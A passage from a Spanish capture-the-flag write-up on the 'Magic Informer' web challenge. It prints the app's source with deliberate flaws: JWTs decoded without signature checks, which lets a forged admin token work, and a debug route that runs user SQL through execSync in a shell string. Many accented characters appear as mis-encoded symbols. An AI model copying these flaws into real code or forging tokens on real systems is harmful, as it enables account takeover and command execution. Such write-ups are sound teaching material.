<span class="mtk1">        </span><span class="mtk1">method</span><span class="mtk1">: </span><span class="mtk1">verb</span><span class="mtk1">.</span><span class="mtk8">toLowerCase</span><span class="mtk1">(),</span>
<span class="mtk1">        </span><span class="mtk1">url</span><span class="mtk1">: </span><span class="mtk1">url</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk1">timeout</span><span class="mtk1">: </span><span class="mtk6">5000</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk1">headers</span><span class="mtk1">: </span><span class="mtk1">parsedHeaders</span>
<span class="mtk1">    };</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">verb</span><span class="mtk1"> </span><span class="mtk5">===</span><span class="mtk1"> </span><span class="mtk4">'POST'</span><span class="mtk1">) </span><span class="mtk1">options</span><span class="mtk1">.data </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">params</span><span class="mtk1">;</span>

<span class="mtk1">    </span><span class="mtk8">axios</span><span class="mtk1">(</span><span class="mtk1">options</span><span class="mtk1">)</span>
<span class="mtk1">        .</span><span class="mtk8">then</span><span class="mtk1">(</span><span class="mtk9 mtki">response</span><span class="mtk1"> </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">typeof</span><span class="mtk1">(</span><span class="mtk9 mtki">response</span><span class="mtk1">.data) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'object'</span><span class="mtk1">) {</span>
<span class="mtk1">                </span><span class="mtk9 mtki">response</span><span class="mtk1">.data </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">JSON</span><span class="mtk1">.</span><span class="mtk8">stringify</span><span class="mtk1">(</span><span class="mtk9 mtki">response</span><span class="mtk1">.data);</span>
<span class="mtk1">            }</span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">json</span><span class="mtk1">({</span><span class="mtk1">status</span><span class="mtk1">: </span><span class="mtk4">'success'</span><span class="mtk1">, </span><span class="mtk1">result</span><span class="mtk1">: </span><span class="mtk9 mtki">response</span><span class="mtk1">.data})</span>
<span class="mtk1">        })</span>
<span class="mtk1">        .</span><span class="mtk8">catch</span><span class="mtk1">(</span><span class="mtk9 mtki">e</span><span class="mtk1"> </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">e</span><span class="mtk1">.response) {</span>
<span class="mtk1">                </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">typeof</span><span class="mtk1">(</span><span class="mtk9 mtki">e</span><span class="mtk1">.response.data) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'object'</span><span class="mtk1">) {</span>
<span class="mtk1">                    </span><span class="mtk9 mtki">e</span><span class="mtk1">.response.data </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">JSON</span><span class="mtk1">.</span><span class="mtk8">stringify</span><span class="mtk1">(</span><span class="mtk9 mtki">e</span><span class="mtk1">.response.data);</span>
<span class="mtk1">                }</span>
<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">json</span><span class="mtk1">({</span><span class="mtk1">status</span><span class="mtk1">: </span><span class="mtk4">'fail'</span><span class="mtk1">, </span><span class="mtk1">result</span><span class="mtk1">: </span><span class="mtk9 mtki">e</span><span class="mtk1">.response.data})</span>
<span class="mtk1">            }</span>
<span class="mtk1">            </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">json</span><span class="mtk1">({</span><span class="mtk1">status</span><span class="mtk1">: </span><span class="mtk4">'fail'</span><span class="mtk1">, </span><span class="mtk1">result</span><span class="mtk1">: </span><span class="mtk4">'Address is unreachable'</span><span class="mtk1">});</span>
<span class="mtk1">            }</span>
<span class="mtk1">        })</span>
<span class="mtk1">});</span>

<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'/sql-prompt'</span><span class="mtk1">, AdminMiddleware, </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>

<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">'sql-prompt.html'</span><span class="mtk1">, { </span><span class="mtk1">user</span><span class="mtk1">: </span><span class="mtk9 mtki">req</span><span class="mtk1">.user });</span>
<span class="mtk1">});</span>

<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span><span class="mtk4">'/debug/sql/exec'</span><span class="mtk1">, LocalMiddleware, AdminMiddleware, </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>

<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> { </span><span class="mtk1">sql</span><span class="mtk1">, </span><span class="mtk1">password</span><span class="mtk1"> } </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.body;</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">sql</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk1">password</span><span class="mtk1"> </span><span class="mtk5">===</span><span class="mtk1"> </span><span class="mtk1">process</span><span class="mtk1">.</span><span class="mtk1">env</span><span class="mtk1">.DEBUG_PASS) {</span>
<span class="mtk1">        </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">            </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">safeSql</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">String</span><span class="mtk1">(</span><span class="mtk1">sql</span><span class="mtk1">).</span><span class="mtk8">replaceAll</span><span class="mtk1">(</span><span class="mtk4">/"/</span><span class="mtk5">ig</span><span class="mtk1">, </span><span class="mtk4">"'"</span><span class="mtk1">);</span>

<span class="mtk1">            </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">cmdStr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">`sqlite3 -csv admin.db "</span><span class="mtk5">${</span><span class="mtk1">safeSql</span><span class="mtk5">}</span><span class="mtk4">"`</span><span class="mtk1">;</span>

<span class="mtk1">            </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">cmdExec</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">execSync</span><span class="mtk1">(</span><span class="mtk1">cmdStr</span><span class="mtk1">);</span>

<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">json</span><span class="mtk1">({</span><span class="mtk1">sql</span><span class="mtk1">, </span><span class="mtk1">output</span><span class="mtk1">: </span><span class="mtk1">cmdExec</span><span class="mtk1">.</span><span class="mtk8">toString</span><span class="mtk1">()});</span>
<span class="mtk1">        }</span>
<span class="mtk1">        </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk1">e</span><span class="mtk1">) {</span>
<span class="mtk1">            </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">output</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">e</span><span class="mtk1">.</span><span class="mtk8">toString</span><span class="mtk1">();</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">e</span><span class="mtk1">.stderr) </span><span class="mtk1">output</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">e</span><span class="mtk1">.stderr.</span><span class="mtk8">toString</span><span class="mtk1">();</span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">json</span><span class="mtk1">({</span><span class="mtk1">sql</span><span class="mtk1">, </span><span class="mtk1">output</span><span class="mtk1">});</span>
<span class="mtk1">        }</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">500</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk8">response</span><span class="mtk1">(</span><span class="mtk4">'Invalid debug password supplied!'</span><span class="mtk1">));</span>
<span class="mtk1">});</span>

<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'/logout'</span><span class="mtk1">, (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">clearCookie</span><span class="mtk1">(</span><span class="mtk4">'session'</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/'</span><span class="mtk1">);</span>
<span class="mtk1">});</span>

<span class="mtk5">export</span><span class="mtk1"> </span><span class="mtk5">default</span><span class="mtk1"> </span><span class="mtk9 mtki">database</span><span class="mtk1"> </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk1">db</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">database</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">router</span><span class="mtk1">;</span>
<span class="mtk1">};</span>
</code></pre></div><p>Algunas de las rutas est谩n protegidas con <code>Authmiddleware</code>, que b谩sicamente verifica que tenemos un <em>token</em> JWT v谩lido en una cookie llamada <code>session</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">read_file</span> /app/middleware/AuthMiddleware.js  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">import</span><span class="mtk1"> { decode } </span><span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk4">"../helpers/JWTHelper.js"</span><span class="mtk1">;</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">AuthMiddleware</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">, </span><span class="mtk9 mtki">next</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">try</span><span class="mtk1">{</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">.cookies.session </span><span class="mtk5">===</span><span class="mtk1"> </span><span class="mtk6">undefined</span><span class="mtk1">) {</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk5">!</span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk8">is</span><span class="mtk1">(</span><span class="mtk4">'application/json'</span><span class="mtk1">)) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/'</span><span class="mtk1">);</span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">401</span><span class="mtk1">).</span><span class="mtk8">json</span><span class="mtk1">({ </span><span class="mtk1">status</span><span class="mtk1">: </span><span class="mtk4">'unauthorized'</span><span class="mtk1">, </span><span class="mtk1">message</span><span class="mtk1">: </span><span class="mtk4">'Authentication required!'</span><span class="mtk1"> });</span>  
<span class="mtk1">        }</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">decode</span><span class="mtk1">(</span><span class="mtk9 mtki">req</span><span class="mtk1">.cookies.session)</span>
<span class="mtk1">            .</span><span class="mtk8">then</span><span class="mtk1">(</span><span class="mtk9 mtki">user</span><span class="mtk1"> </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">                </span><span class="mtk9 mtki">req</span><span class="mtk1">.user </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">user</span><span class="mtk1">;</span>
<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">next</span><span class="mtk1">();</span>
<span class="mtk1">            })</span>
<span class="mtk1">            .</span><span class="mtk8">catch</span><span class="mtk1">((</span><span class="mtk9 mtki">e</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">                </span><span class="mtk1">console</span><span class="mtk1">.</span><span class="mtk8">log</span><span class="mtk1">(</span><span class="mtk9 mtki">e</span><span class="mtk1">);</span>
<span class="mtk1">                </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/logout'</span><span class="mtk1">);</span>
<span class="mtk1">            });</span>
<span class="mtk1">    } </span><span class="mtk5">catch</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk1">console</span><span class="mtk1">.</span><span class="mtk8">log</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/logout'</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>
<span class="mtk1">}</span>

<span class="mtk5">export</span><span class="mtk1"> { </span><span class="mtk8">AuthMiddleware</span><span class="mtk1"> };</span>
</code></pre></div><p>Hay otras rutas que est谩n protegidas con <code>AdminMiddleware</code>, que es lo mismo que <code>Authmiddleware</code> pero adem谩s verifica que nuestro usuario es <code>admin</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">read_file</span> /app/middleware/AdminMiddleware.js  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">import</span><span class="mtk1"> { decode } </span><span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk4">"../helpers/JWTHelper.js"</span><span class="mtk1">;</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">AdminMiddleware</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">, </span><span class="mtk9 mtki">next</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">try</span><span class="mtk1">{</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">.cookies.session </span><span class="mtk5">===</span><span class="mtk1"> </span><span class="mtk6">undefined</span><span class="mtk1">) {</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk5">!</span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk8">is</span><span class="mtk1">(</span><span class="mtk4">'application/json'</span><span class="mtk1">)) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/'</span><span class="mtk1">);</span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">401</span><span class="mtk1">).</span><span class="mtk8">json</span><span class="mtk1">({ </span><span class="mtk1">status</span><span class="mtk1">: </span><span class="mtk4">'unauthorized'</span><span class="mtk1">, </span><span class="mtk1">message</span><span class="mtk1">: </span><span class="mtk4">'Authentication required!'</span><span class="mtk1"> });</span>  
<span class="mtk1">        }</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">decode</span><span class="mtk1">(</span><span class="mtk9 mtki">req</span><span class="mtk1">.cookies.session)</span>
<span class="mtk1">            .</span><span class="mtk8">then</span><span class="mtk1">(</span><span class="mtk9 mtki">user</span><span class="mtk1"> </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">                </span><span class="mtk9 mtki">req</span><span class="mtk1">.user </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">user</span><span class="mtk1">;</span>
<span class="mtk1">                </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">.user.username </span><span class="mtk5">!==</span><span class="mtk1"> </span><span class="mtk4">'admin'</span><span class="mtk1">) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/dashboard'</span><span class="mtk1">);</span>

<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">next</span><span class="mtk1">();</span>
<span class="mtk1">            })</span>
<span class="mtk1">            .</span><span class="mtk8">catch</span><span class="mtk1">(() </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">                </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/logout'</span><span class="mtk1">);</span>
<span class="mtk1">            });</span>
<span class="mtk1">    } </span><span class="mtk5">catch</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk1">console</span><span class="mtk1">.</span><span class="mtk8">log</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/logout'</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>
<span class="mtk1">}</span>

<span class="mtk5">export</span><span class="mtk1"> { </span><span class="mtk8">AdminMiddleware</span><span class="mtk1"> };</span>
</code></pre></div><p>Estos dos <em>middlewares</em> usan <code>helper/JWTHelper.js</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">read_file</span> /app/helpers/JWTHelper.js  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">import</span><span class="mtk1"> jwt </span><span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk4">"jsonwebtoken"</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> crypto </span><span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk4">"crypto"</span><span class="mtk1">;</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">APP_SECRET</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">crypto</span><span class="mtk1">.</span><span class="mtk8">randomBytes</span><span class="mtk1">(</span><span class="mtk6">69</span><span class="mtk1">).</span><span class="mtk8">toString</span><span class="mtk1">(</span><span class="mtk4">'hex'</span><span class="mtk1">);</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">sign</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk9 mtki">data</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk9 mtki">data</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">Object</span><span class="mtk1">.</span><span class="mtk8">assign</span><span class="mtk1">(</span><span class="mtk9 mtki">data</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> (jwt.</span><span class="mtk8">sign</span><span class="mtk1">(</span><span class="mtk9 mtki">data</span><span class="mtk1">, </span><span class="mtk1">APP_SECRET</span><span class="mtk1">, { </span><span class="mtk1">algorithm</span><span class="mtk1">:</span><span class="mtk4">'HS256'</span><span class="mtk1"> }))</span>  
<span class="mtk1">}</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">decode</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">async</span><span class="mtk1">(</span><span class="mtk9 mtki">token</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> (jwt.</span><span class="mtk8">decode</span><span class="mtk1">(</span><span class="mtk9 mtki">token</span><span class="mtk1">));</span>
<span class="mtk1">}</span>

<span class="mtk5">export</span><span class="mtk1"> { </span><span class="mtk8">sign</span><span class="mtk1">, </span><span class="mtk8">decode</span><span class="mtk1"> };</span>
</code></pre></div><p>Aqu铆 tenemos una vulnerabilidad, ya que <code>jwt.decode</code> solo decodificar谩 el contenido del <em>token</em>, no verificar谩 que la firma es v谩lida (eso habr铆a sido con <code>jwt.verify</code>).</p><h2 id="efectuando-el-ataque">Efectuando el ataque</h2><p>Un JWT (JSON Web Token) es una forma de codificar datos en formato JSON en Base64 y firmarlo para que la integridad del contenido est茅 protegida. En <a href="https://jwt.io">jwt.io</a> podemos pegar nuestro <em>token</em> y ver qu茅 informaci贸n contiene:</p><p><img src="/images/other/HTB%20UniCTF/The-Magic-Informer-13.png" alt="The Magic Informer 13"></p><h3 id="convirti茅ndonos-en-admin">Convirti茅ndonos en <code>admin</code></h3><p>La parte morada es el contenido, que es el valor devuelto de <code>jwt.decode</code>. Si modificamos nuestro nombre de usuario para que sea <code>admin</code>, el JWT se corrompe porque la firma no coincidir谩. Sin embargo, el servidor no valida la firma:</p><p><img src="/images/other/HTB%20UniCTF/The-Magic-Informer-14.png" alt="The Magic Informer 14"></p><p>Entonces, si establecemos este nuevo <em>token</em> JWT como <em>cookie</em> y actualizamos la p谩gina, estaremos como <code>admin</code> (esto se conoce como <em>Broken Access Control</em>):</p><p><img src="/images/other/HTB%20UniCTF/The-Magic-Informer-15.png" alt="The Magic Informer 15"></p><h3 id="m谩s-an谩lisis-de-c贸digo-fuente">M谩s an谩lisis de c贸digo fuente</h3><p>En este punto, tenemos acceso a <em>endpoints</em> protegidos con <code>AdminMiddleware</code>. Por ejemplo, podemos usar <code>/api/sms/test</code> y <code>/debug/sql/exec</code> (entre otros). Este 煤ltimo es accesible desde <code>/sql-prompt</code>:</p><p><img src="/images/other/HTB%20UniCTF/The-Magic-Informer-16.png" alt="The Magic Informer 16"></p><p>Pero dice que solo se permite para <code>localhost</code>. De hecho, <code>/debug/sql/exec</code> est谩 protegido con <code>LocalMiddleware</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">read_file</span> /app/middleware/LocalMiddleware.js  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">LocalMiddleware</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">, </span><span class="mtk9 mtki">next</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">.ip </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'127.0.0.1'</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.headers.host </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'127.0.0.1:1337'</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">next</span><span class="mtk1">();</span>
<span class="mtk1">    }</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">401</span><span class="mtk1">).</span><span class="mtk8">json</span><span class="mtk1">({ </span><span class="mtk1">message</span><span class="mtk1">: </span><span class="mtk4">'Blocked: This endpoint is whitelisted to localhos</span><span class="mtk4">t only.'</span><span class="mtk1"> });</span>  
<span class="mtk1">}</span>

<span class="mtk5">export</span><span class="mtk1"> { </span><span class="mtk8">LocalMiddleware</span><span class="mtk1"> };</span>
</code></pre></div><p>Entonces, <code>/debug/sql/exec</code> debe ser accedido desde <code>localhost</code>. Si inspeccionamos las dependencias del proyecto Node.js, podemos encontrar <code>axios</code>, que es un m贸dulo para realizar peticiones web:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">read_file</span> /app/package.json  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">{</span>
<span class="mtk1">    </span><span class="mtk7 mtki">"name"</span><span class="mtk1">: </span><span class="mtk11">"magic_informer"</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk7 mtki">"version"</span><span class="mtk1">: </span><span class="mtk11">"1.0.0"</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk7 mtki">"description"</span><span class="mtk1">: </span><span class="mtk11">""</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk7 mtki">"main"</span><span class="mtk1">: </span><span class="mtk11">"index.js"</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk7 mtki">"type"</span><span class="mtk1">: </span><span class="mtk11">"module"</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk7 mtki">"scripts"</span><span class="mtk1">: {</span>
<span class="mtk1">        </span><span class="mtk7 mtki">"start"</span><span class="mtk1">: </span><span class="mtk11">"node index.js"</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk7 mtki">"dev"</span><span class="mtk1">: </span><span class="mtk11">"nodemon -e js,css,html"</span>  
<span class="mtk1">    },</span>
<span class="mtk1">    </span><span class="mtk7 mtki">"keywords"</span><span class="mtk1">: [],</span>
<span class="mtk1">    </span><span class="mtk7 mtki">"author"</span><span class="mtk1">: </span><span class="mtk11">"rayhan0x01"</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk7 mtki">"license"</span><span class="mtk1">: </span><span class="mtk11">"ISC"</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk7 mtki">"dependencies"</span><span class="mtk1">: {</span>
<span class="mtk1">        </span><span class="mtk7 mtki">"axios"</span><span class="mtk1">: </span><span class="mtk11">"1.2.0"</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk7 mtki">"cookie-parser"</span><span class="mtk1">: </span><span class="mtk11">"1.4.6"</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk7 mtki">"dotenv"</span><span class="mtk1">: </span><span class="mtk11">"^16.0.3"</span><span class="mtk1">,</span>
